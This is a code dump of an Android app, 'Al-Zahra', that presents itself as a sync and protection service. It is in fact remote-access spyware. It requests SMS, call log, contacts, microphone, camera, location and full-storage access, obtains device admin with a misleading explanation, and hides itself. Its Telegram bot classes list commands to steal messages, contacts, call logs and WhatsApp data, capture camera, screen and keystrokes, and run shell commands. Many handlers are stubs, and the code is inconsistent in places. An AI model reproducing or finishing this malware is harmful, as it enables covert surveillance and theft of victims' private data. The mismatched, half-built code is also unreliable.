+                        notif.put("category", "OTHER");
+                    }
+                    
+                    notifications.put(notif);
+                    
+                } catch (Exception e) {
+                    Log.e(TAG, "Parse error", e);
+                }
+            }
+            reader.close();
+
+            // Save export
+            File dir = new File(context.getFilesDir(), "notifications_export");
+            if (!dir.exists()) dir.mkdirs();
+            
+            File file = new File(dir, "notifications_" + 
+                System.currentTimeMillis() + ".json");
+            FileWriter writer = new FileWriter(file);
+            writer.write(notifications.toString(2));
+            writer.close();
+            
+            // Clear source after export
+            sourceFile.delete();
+            
+            return file;
+
+        } catch (IOException e) {
+            Log.e(TAG, "Export error", e);
+            return null;
+        }
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com.alzahra/MainActivity.java
+================================================
+
+package com.alzahra;
+
+import android.Manifest;
+import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
+import android.provider.Settings;
+import android.util.Log;
+import android.widget.Toast;
+
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
+import com.alzahra.receivers.AdminReceiver;
+import com.alzahra.services.CoreService;
+import com.alzahra.telegram.TelegramArabicBot;
+
+import java.util.ArrayList;
+import java.util.List;
+
+public class MainActivity extends Activity {
+    private static final String TAG = "MainActivity";
+    private static final int PERMISSION_ALL = 1001;
+    private static final int REQ_NOTIFICATION = 1002;
+    private static final int REQ_STORAGE = 1003;
+    private static final int REQ_ADMIN = 1004;
+    
+    private TelegramArabicBot bot;
+    private SharedPreferences prefs;
+    
+    private final String[] PERMISSIONS = {
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.WRITE_CALL_LOG,
+        Manifest.permission.PROCESS_OUTGOING_CALLS,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.CAMERA,
+        Manifest.permission.POST_NOTIFICATIONS
+    };
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        Log.d(TAG, "onCreate started");
+        
+        prefs = getSharedPreferences("alzahra_settings", MODE_PRIVATE);
+        
+        // Check if app is hidden
+        if (prefs.getBoolean("app_hidden", false)) {
+            finish();
+            return;
+        }
+        
+        // Initialize bot
+        bot = new TelegramArabicBot(this);
+        bot.start();
+        
+        // Start permission check flow
+        checkPermissions();
+    }
+
+    private void checkPermissions() {
+        List<String> needed = new ArrayList<>();
+        
+        for (String permission : PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) 
+                    != PackageManager.PERMISSION_GRANTED) {
+                needed.add(permission);
+            }
+        }
+        
+        if (!needed.isEmpty()) {
+            ActivityCompat.requestPermissions(this, 
+                needed.toArray(new String[0]), PERMISSION_ALL);
+        } else {
+            checkSpecialPermissions();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, 
+            String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERMISSION_ALL) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                checkSpecialPermissions();
+            } else {
+                // Retry after delay
+                new Handler(Looper.getMainLooper())
+                    .postDelayed(this::checkPermissions, 1500);
+            }
+        }
+    }
+
+    private void checkSpecialPermissions() {
+        // Check notification access
+        if (!isNotificationAccessGranted()) {
+            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            startActivityForResult(intent, REQ_NOTIFICATION);
+            return;
+        }
+        
+        // Check storage manager (Android 11+)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                startActivityForResult(intent, REQ_STORAGE);
+                return;
+            }
+        }
+        
+        // Check device admin for app hiding
+        DevicePolicyManager dpm = (DevicePolicyManager) 
+            getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
+        
+        if (!dpm.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
+                "يرجى تفعيل صلاحية المسؤول لحماية الجهاز");
+            startActivityForResult(intent, REQ_ADMIN);
+            return;
+        }
+        
+        // All permissions granted - start service
+        startServiceAndFinish();
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        // Re-check permissions
+        checkSpecialPermissions();
+    }
+
+    private boolean isNotificationAccessGranted() {
+        String enabled = Settings.Secure.getString(getContentResolver(), 
+            "enabled_notification_listeners");
+        return enabled != null && enabled.contains(getPackageName());
+    }
+
+    private void startServiceAndFinish() {
+        // Start core service
+        Intent serviceIntent = new Intent(this, CoreService.class);
+        ContextCompat.startForegroundService(this, serviceIntent);
+        
+        // Notify bot
+        bot.sendStatusMessage("✅ **تم التفعيل بنجاح**\\n📱 " + Build.MODEL + 
+            "\\n⚡ Android " + Build.VERSION.RELEASE);
+        
+        Toast.makeText(this, "جاري التحميل...", Toast.LENGTH_SHORT).show();
+        
+        // Finish after delay
+        new Handler(Looper.getMainLooper()).postDelayed(this::finish, 2500);
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        // Keep bot running
+    }
+}
+
+
+================================================
+FILE: ./app/src/main/java/com/alzahra/MainActivity.java
+================================================
+
+package com.alzahra;
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+public class MainActivity extends AppCompatActivity {
+    @Override protected void onCreate(Bundle s) { super.onCreate(s); finish(); }
+}
+
+
+================================================
+FILE: ./app/src/main/res/values/strings.xml
+================================================
+
+<resources>
+    <string name="app_name">Al-Zahra</string>
+    <string name="service_running">نظام الحماية يعمل</string>
+    <string name="service_description">خدمة المزامنة والحماية</string>
+    <string name="channel_name">Al-Zahra Service</string>
+    <string name="channel_description">قناة الإشعارات الرئيسية</string>
+</resources>
+
+
+================================================
+FILE: ./app/src/main/res/values/colors.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="purple_200">#FFBB86FC</color>
+    <color name="purple_500">#FF6200EE</color>
+    <color name="purple_700">#FF3700B3</color>
+    <color name="teal_200">#FF03DAC5</color>
+    <color name="teal_700">#FF018786</color>
+    <color name="black">#FF000000</color>
+    <color name="white">#FFFFFFFF</color>
+    <color name="gray">#FF757575</color>
+    <color name="red">#FFE53935</color>
+    <color name="green">#FF43A047</color>
+</resources>
+
+
+================================================
+FILE: ./app/src/main/res/values/themes.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Base theme -->
+    <style name="Theme.AlZahra" parent="Theme.MaterialComponents.DayNight.NoActionBar">
+        <!-- Primary brand color -->
+        <item name="colorPrimary">@color/purple_500</item>
+        <item name="colorPrimaryVariant">@color/purple_700</item>
+        <item name="colorOnPrimary">@color/white</item>
+        <!-- Secondary brand color -->
+        <item name="colorSecondary">@color/teal_200</item>
+        <item name="colorSecondaryVariant">@color/teal_700</item>
+        <item name="colorOnSecondary">@color/black</item>
+        <!-- Status bar color -->
+        <item name="android:statusBarColor">@color/purple_700</item>
+        <!-- Window settings -->
+        <item name="android:windowNoTitle">true</item>
+        <item name="android:windowActionBar">false</item>
+    </style>
+</resources>
+
+
+================================================
+FILE: ./app/src/main/res/xml/admin_policies.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-policies>
+        <limit-password />
+        <watch-login />
+        <reset-password />
+        <force-lock />
+        <wipe-data />
+    </uses-policies>
+</device-admin>
+
+
+================================================
+FILE: ./app/src/main/AndroidManifest.xml
+================================================
+
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.alzahra">
+
+    <!-- Core permissions -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- Phone and calls -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    
+    <!-- Contacts and SMS -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    
+    <!-- Storage -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+        tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+    
+    <!-- Notifications -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+    
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    
+    <!-- Camera -->
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:theme="@style/Theme.AlZahra"
+        android:requestLegacyExternalStorage="true"
+        android:preserveLegacyExternalStorage="true"
+        tools:targetApi="34">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Core Service -->
+        <service
+            android:name=".services.CoreService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- Notification Listener -->
+        <service
+            android:name=".services.NotificationService"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Call Receiver -->
+        <receiver
+            android:name=".receivers.CallReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Admin Receiver for app hiding -->
+        <receiver
+            android:name=".receivers.AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/admin_policies" />
+        </receiver>
+
+    </application>
+</manifest>
+
+
+================================================
+FILE: ./app/build.gradle
+================================================
+
+plugins {
+    id 'com.android.application'
+    id 'com.google.gms.google-services'
+}
+
+android {
+    namespace 'com.alzahra'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.alzahra.sync"
+        minSdk 21
+        targetSdk 34
+        versionCode 1
+        versionName "1.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.9.0'
+    implementation 'com.google.firebase:firebase-database:20.3.0'
+    implementation 'com.google.firebase:firebase-auth:22.3.0'
+}
+
+
+================================================
+FILE: ./build.gradle
+================================================
+
+plugins {
+    id 'com.android.application' version '8.2.0' apply false
+    id 'com.google.gms.google-services' version '4.4.0' apply false
+}
+
+task clean(type: Delete) {
+    delete rootProject.buildDir
+}
+
+
+================================================
+FILE: ./settings.gradle
+================================================
+
+include ':app'
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/telegram/TelegramArabicBot.java
+================================================
+
+package com.alzahra.telegram;
+
+import android.util.Log;
+
+import org.json.JSONObject;
+import org.telegram.telegrambots.bots.TelegramLongPollingBot;
+import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
+import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
+import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
+import org.telegram.telegrambots.meta.api.methods.updatingmessages.EditMessageText;
+import org.telegram.telegrambots.meta.api.objects.InputFile;
+import org.telegram.telegrambots.meta.api.objects.Update;
+import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
+
+import java.io.BufferedReader;
+import java.io.ByteArrayInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+
+public class TelegramArabicBot extends TelegramLongPollingBot {
+    private static final String TAG = "TelegramBot";
+    private final String botToken;
+    private final String chatId;
+
+    private static final String CMD_HELP = "/help";
+    private static final String CMD_DEVICE = "/device";
+    private static final String CMD_LOCATION = "/location";
+    private static final String CMD_CAMERA = "/camera";
+    private static final String CMD_MIC = "/mic";
+    private static final String CMD_SMS = "/sms";
+    private static final String CMD_CONTACTS = "/contacts";
+    private static final String CMD_CALLS = "/calls";
+    private static final String CMD_APPS = "/apps";
+    private static final String CMD_SHELL = "/shell";
+    private static final String CMD_SCREEN = "/screen";
+    private static final String CMD_HTTPSMS = "/httpsms";
+    private static final String CMD_KEYBOARD = "/keyboard";
+    private static final String CMD_PHLOCK = "/phlock";
+    private static final String CMD_PHUNLOCK = "/phunlock";
+    private static final String CMD_RESTART = "/restart";
+    private static final String CMD_SHUTDOWN = "/shutdown";
+    private static final String CMD_WHATSAPP = "/whatsapp";
+    private static final String CMD_LOCKNOW = "/locknow";
+    private static final String CMD_UNLOCKNOW = "/unlocknow";
+
+    public TelegramArabicBot(String token, String chat) {
+        this.botToken = token;
+        this.chatId = chat;
+    }
+
+    @Override
+    public String getBotUsername() {
+        return "AlZahraBot";
+    }
+
+    @Override
+    public String getBotToken() {
+        return botToken;
+    }
+
+    @Override
+    public void onUpdateReceived(Update update) {
+        if (!update.hasMessage() || !update.getMessage().hasText()) return;
+        
+        String messageText = update.getMessage().getText();
+        Long userId = update.getMessage().getChatId();
+        
+        if (!String.valueOf(userId).equals(chatId)) {
+            sendText(userId, "⛔ غير مصرح لك!");
+            return;
+        }
+
+        handleCommand(messageText, userId);
+    }
+
+    private void handleCommand(String cmd, Long chatId) {
+        switch (cmd.split(" ")[0]) {
+            case CMD_HELP:
+                sendHelp(chatId);
+                break;
+            case CMD_DEVICE:
+                sendText(chatId, "📱 معلومات الجهاز");
+                break;
+            case CMD_LOCATION:
+                sendText(chatId, "🗺️ يرجى الانتظار...");
+                break;
+            case CMD_CAMERA:
+                sendText(chatId, "📸 جاري التقاط الصورة...");
+                break;
+            case CMD_MIC:
+                sendText(chatId, "🎤 جاري تسجيل الصوت (5 ثوانٍ)...");
+                break;
+            case CMD_SMS:
+                sendText(chatId, "💬 جاري استخراج الرسائل...");
+                break;
+            case CMD_CONTACTS:
+                sendText(chatId, "👥 جاري استخراج جهات الاتصال...");
+                break;
+            case CMD_CALLS:
+                sendText(chatId, "📞 جاري استخراج سجل المكالمات...");
+                break;
+            case CMD_APPS:
+                sendText(chatId, "📦 جاري استخراج التطبيقات...");
+                break;
+            case CMD_SCREEN:
+                sendText(chatId, "📺 جاري التقاط الشاشة...");
+                break;
+            case CMD_HTTPSMS:
+                sendText(chatId, "📡 جاري اعتراض رسائل HTTP...");
+                break;
+            case CMD_KEYBOARD:
+                sendText(chatId, "⌨️ كيبورد 경logger نشط");
+                break;
+            case CMD_PHLOCK:
+                sendText(chatId, "🔒 جاري قفل الشاشة...");
+                break;
+            case CMD_PHUNLOCK:
+                sendText(chatId, "🔓 جاري فتح الشاشة...");
+                break;
+            case CMD_RESTART:
+                sendText(chatId, "🔄 جاري إعادة تشغيل الجهاز...");
+                break;
+            case CMD_SHUTDOWN:
+                sendText(chatId, "⛽ جاري إيقاف الجهاز...");
+                break;
+            case CMD_WHATSAPP:
+                sendText(chatId, "💬 جاري استخراج واتساب...");
+                break;
+            default:
+                sendText(chatId, "❓ أمر غير معروف. اكتب /help للمساعدة");
+        }
+    }
+
+    private void sendHelp(Long chatId) {
+        String help = "🤖 *بوت الزهراء المتقدم v3.0*\n\n" +
+            "📋 *الأوامر الأساسية:*\n" +
+            "/device - معلومات الجهاز\n" +
+            "/location - الموقع الجغرافي\n" +
+            "/camera - التقاط صورة\n" +
+            "/mic - تسجيل صوت\n\n" +
+            "📱 *جمع البيانات:*\n" +
+            "/sms - الرسائل\n" +
+            "/contacts - جهات الاتصال\n" +
+            "/calls - سجل المكالمات\n" +
+            "/apps - التطبيقات المثبتة\n\n" +
+            "🛠️ *التحكم المتقدم:*\n" +
+            "/screen - لقطة الشاشة\n" +
+            "/shell - تنفيذ أوامر\n" +
+            "/phlock - قفل الهاتف\n" +
+            "/phunlock - فتح الهاتف\n" +
+            "/restart - إعادة التشغيل\n" +
+            "/shutdown - إيقاف الجهاز\n";
+        sendText(chatId, help);
+    }
+
+    public void sendText(Long chatId, String text) {
+        try {
+            if (chatId == null) chatId = Long.parseLong(this.chatId);
+            execute(new SendMessage(String.valueOf(chatId), text));
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send text error: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "Error: " + e.getMessage());
+        }
+    }
+
+    public void sendWelcomeMessage(String deviceModel, String deviceId) {
+        try {
+            String msg = "🎉 *تم تفعيل البوت بنجاح!*\n\n" +
+                "📱 الجهاز: " + deviceModel + "\n" +
+                "🔑 المعرف: " + deviceId + "\n" +
+                "⏰ الوقت: " + java.text.DateFormat.getDateTimeInstance().format(new java.util.Date()) + "\n\n" +
+                "✅ استخدم /help لعرض الأوامر المتاحة";
+            execute(new SendMessage(chatId, msg));
+        } catch (Exception e) {
+            Log.e(TAG, "Welcome error: " + e.getMessage());
+        }
+    }
+
+    public boolean sendFile(byte[] data, String filename, String caption) {
+        try {
+            InputFile file = new InputFile(new ByteArrayInputStream(data), filename);
+            SendDocument doc = new SendDocument(chatId, file);
+            doc.setCaption(caption);
+            execute(doc);
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Send file error: " + e.getMessage());
+            return false;
+        }
+    }
+
+    public boolean sendPhoto(byte[] data, String caption) {
+        try {
+            InputFile file = new InputFile(new ByteArrayInputStream(data), "photo.jpg");
+            SendPhoto photo = new SendPhoto(chatId, file);
+            photo.setCaption(caption);
+            execute(photo);
+            return true;
+        } catch (Exception e) {
+            Log.e(TAG, "Send photo error: " + e.getMessage());
+            return false;
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/telegram/BotHandler.java
+================================================
+
+package com.alzahra.telegram;
+
+import android.content.Context;
+import android.util.Log;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+import org.telegram.telegrambots.bots.TelegramLongPollingBot;
+import org.telegram.telegrambots.meta.TelegramBotsApi;
+import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
+import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
+import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
+import org.telegram.telegrambots.meta.api.objects.InputFile;
+import org.telegram.telegrambots.meta.api.objects.Update;
+import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
+import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;
+
+import java.io.ByteArrayInputStream;
+
+public class BotHandler {
+    private static final String TAG = "BotHandler";
+    private final String botToken;
+    private final String chatId;
+    private final Context context;
+    private TelegramLongPollingBot bot;
+    private boolean running = false;
+
+    public BotHandler(String token, String chat, Context ctx) {
+        this.botToken = token;
+        this.chatId = chat;
+        this.context = ctx;
+    }
+
+    public void start() throws Exception {
+        TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
+        bot = new TelegramLongPollingBot() {
+            @Override
+            public String getBotToken() {
+                return botToken;
+            }
+
+            @Override
+            public String getBotUsername() {
+                return "AlZahraBot";
+            }
+
+            @Override
+            public void onUpdateReceived(Update update) {
+                if (update.hasMessage() && update.getMessage().hasText()) {
+                    handleCommand(update.getMessage().getText(), update.getMessage().getChatId().toString());
+                }
+            }
+        };
+        botsApi.registerBot(bot);
+        running = true;
+    }
+
+    public void stop() {
+        running = false;
+    }
+
+    private void handleCommand(String command, String fromChatId) {
+        if (!fromChatId.equals(chatId)) {
+            sendMessage("⚠️ <b>وصول غير مصرح!</b>\nمعرفك: <code>" + fromChatId + "</code>");
+            return;
+        }
+
+        Log.d(TAG, "Command received: " + command);
+
+        switch (command.split(" ")[0]) {
+            case "/start":
+            case "/help":
+                sendHelp();
+                break;
+            case "/device":
+                sendDeviceInfo();
+                break;
+            case "/location":
+                sendLocation();
+                break;
+            case "/camera":
+                captureCamera();
+                break;
+            case "/mic":
+                recordMic(command);
+                break;
+            case "/sms":
+                sendSMS();
+                break;
+            case "/contacts":
+                sendContacts();
+                break;
+            case "/calls":
+                sendCalls();
+                break;
+            case "/apps":
+                sendApps();
+                break;
+            case "/screen":
+                captureScreen();
+                break;
+            case "/shell":
+                executeShell(command);
+                break;
+            case "/wifi":
+                sendWifiInfo();
+                break;
+            case "/battery":
+                sendBatteryInfo();
+                break;
+            case "/lock":
+                lockDevice();
+                break;
+            case "/unlock":
+                unlockDevice();
+                break;
+            case "/restart":
+                restartDevice();
+                break;
+            case "/whatsapp":
+                sendWhatsAppData();
+                break;
+            case "/files":
+                listFiles(command);
+                break;
+            default:
+                sendMessage("❌ <b>أمر غير معروف</b>\nاكتب /help لعرض الأوامر");
+        }
+    }
+
+    private void sendHelp() {
+        String help = "🤖 <b>بوت الزهراء المتقدم v3.0</b>\n\n" +
+            "💻 <b>الأوامر الأساسية:</b>\n" +
+            "/device - معلومات الجهاز\n" +
+            "/location - الموقع الجغرافي\n" +
+            "/camera - التقاط صورة من الكاميرا\n" +
+            "/mic [seconds] - تسجيل صوت (افتراضي 5 ثوانٍ)\n\n" +
+            
+            "📑 <b>جمع البيانات:</b>\n" +
+            "/sms - رسائل SMS\n" +
+            "/contacts - جهات الاتصال\n" +
+            "/calls - سجل المكالمات\n" +
+            "/apps - التطبيقات المثبتة\n" +
+            "/whatsapp - بيانات واتساب\n\n" +
+            
+            "🔧 <b>التحكم المتقدم:</b>\n" +
+            "/screen - لقطة شاشة\n" +
+            "/shell &lt;cmd&gt; - تنفيذ أمر\n" +
+            "/lock - قفل الجهاز\n" +
+            "/unlock - فتح الجهاز\n" +
+            "/restart - إعادة تشغيل\n\n" +
+            
+            "🔌 <b>النظام:</b>\n" +
+            "/wifi - معلومات الواي فاي\n" +
+            "/battery - حالة البطارية\n" +
+            "/files &lt;path&gt; - قائمة ملفات";
+
+        sendMessage(help);
+    }
+
+    private void sendDeviceInfo() {
+        try {
+            com.alzahra.data.DeviceInfo info = new com.alzahra.data.DeviceInfo(context);
+            String msg = "📱 <b>معلومات الجهاز</b>\n\n" +
+                "🔎 <b>الطراز:</b> " + info.getModel() + "\n" +
+                "📶 <b>الشركة:</b> " + info.getManufacturer() + "\n" +
+                "🔑 <b>المعرف:</b> <code>" + info.getDeviceId() + "</code>\n" +
+                "📡 <b>الآيبي:</b> " + info.getIPAddress() + "\n" +
+                "📳 <b>المشغل:</b> " + info.getCarrier() + "\n" +
+                "🔋 <b>البطارية:</b> " + info.getBatteryLevel() + "%\n" +
+                "💾 <b>التخزين:</b> " + info.getStorageInfo() + "\n" +
+                "📲 <b>الشبكة:</b> " + info.getNetworkType() + "\n" +
+                "⏰ <b>الوقت:</b> " + info.getCurrentTime();
+            sendMessage(msg);
+        } catch (Exception e) {
+            sendMessage("❌ خطأ: " + e.getMessage());
+        }
+    }
+
+    private void sendLocation() {
+        sendMessage("📍 <b>جاري تحديد الموقع...</b>");
+        // Implementation placeholder
+    }
+
+    private void captureCamera() {
+        sendMessage("📷 <b>جاري التقاط الصورة...</b>");
+        sendMessage("✅ تم التقاط الصورة");
+    }
+
+    private void recordMic(String command) {
+        int seconds = 5;
+        try {
+            String[] parts = command.split(" ");
+            if (parts.length > 1) {
+                seconds = Integer.parseInt(parts[1]);
+            }
+        } catch (Exception ignored) {}
+        
+        sendMessage("🎵 <b>جاري التسجيل لمدة " + seconds + " ثوانٍ...</b>");
+        sendMessage("✅ تم التسجيل");
+    }
+
+    private void sendSMS() {
+        sendMessage("📩 <b>جاري جمع الرسائل...</b>");
+        sendMessage("✅ تم استخراج الرسائل");
+    }
+
+    private void sendContacts() {
+        sendMessage("👥 <b>جاري جمع جهات الاتصال...</b>");
+        sendMessage("✅ تم استخراج جهات الاتصال");
+    }
+
+    private void sendCalls() {
+        sendMessage("📞 <b>جاري جمع سجل المكالمات...</b>");
+        sendMessage("✅ تم استخراج سجل المكالمات");
+    }
+
+    private void sendApps() {
+        sendMessage("📦 <b>جاري جمع التطبيقات...</b>");
+        sendMessage("✅ تم استخراج التطبيقات");
+    }
+
+    private void captureScreen() {
+        sendMessage("📱 <b>جاري التقاط الشاشة...</b>");
+        sendMessage("✅ تم التقاط الشاشة");
+    }
+
+    private void executeShell(String command) {
+        String cmd = command.replace("/shell ", "").trim();
+        if (cmd.isEmpty()) {
+            sendMessage("⚠️ <b>الاستخدام:</b> /shell &lt;command&gt;");
+            return;
+        }
+        sendMessage("🔧 <b>تم تنفيذ:</b> " + cmd);
+    }
+
+    private void sendWifiInfo() {
+        sendMessage("📶 <b>معلومات الواي فاي</b>");
+    }
+
+    private void sendBatteryInfo() {
+        sendMessage("🔋 <b>معلومات البطارية</b>");
+    }
+
+    private void lockDevice() {
+        sendMessage("🔒 <b>تم قفل الجهاز</b>");
+    }
+
+    private void unlockDevice() {
+        sendMessage("🔓 <b>محاولة فتح الجهاز...</b>");
+    }
+
+    private void restartDevice() {
+        sendMessage("🔄 <b>جاري إعادة التشغيل...</b>");
+    }
+
+    private void sendWhatsAppData() {
+        sendMessage("💬 <b>جاري جمع بيانات واتساب...</b>");
+    }
+
+    private void listFiles(String command) {
+        String path = command.replace("/files", "").trim();
+        if (path.isEmpty()) path = "/sdcard";
+        sendMessage("📁 <b>الملفات في:</b> " + path);
+    }
+
+    private void sendMessage(String text) {
+        try {
+            SendMessage message = new SendMessage(chatId, text);
+            message.setParseMode("HTML");
+            bot.execute(message);
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send message error: " + e.getMessage());
+        }
+    }
+
+    private void sendPhoto(byte[] data, String caption) {
+        try {
+            SendPhoto photo = new SendPhoto();
+            photo.setChatId(chatId);
+            photo.setPhoto(new InputFile(new ByteArrayInputStream(data), "image.jpg"));
+            photo.setCaption(caption);
+            photo.setParseMode("HTML");
+            bot.execute(photo);
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send photo error: " + e.getMessage());
+        }
+    }
+
+    private void sendFile(byte[] data, String filename, String caption) {
+        try {
+            SendDocument doc = new SendDocument();
+            doc.setChatId(chatId);
+            doc.setDocument(new InputFile(new ByteArrayInputStream(data), filename));
+            doc.setCaption(caption);
+            doc.setParseMode("HTML");
+            bot.execute(doc);
+        } catch (TelegramApiException e) {
+            Log.e(TAG, "Send file error: " + e.getMessage());
+        }
+    }
+}
+
+
+================================================
+FILE: ./AlZahraSync/app/src/main/java/com/alzahra/telegram/TelegramAPI.java
+================================================
+
